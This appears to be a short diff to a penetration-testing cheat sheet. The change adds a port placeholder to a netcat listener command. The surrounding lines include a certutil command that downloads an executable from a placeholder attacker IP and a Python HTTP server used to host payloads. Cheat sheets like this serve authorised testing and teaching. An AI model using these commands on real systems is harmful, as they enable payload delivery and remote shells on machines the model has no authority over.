@@ -43,7 +43,7 @@ sc query <application>
 certutil.exe -urlcache -f http://<attackerip>:8000/<application.exe> <applicationname.exe>
 
 ## Listener
-nc -nlvp
+nc -nlvp <port>
 
 ## Directory hosting
 python -m SimpleHTTPServer
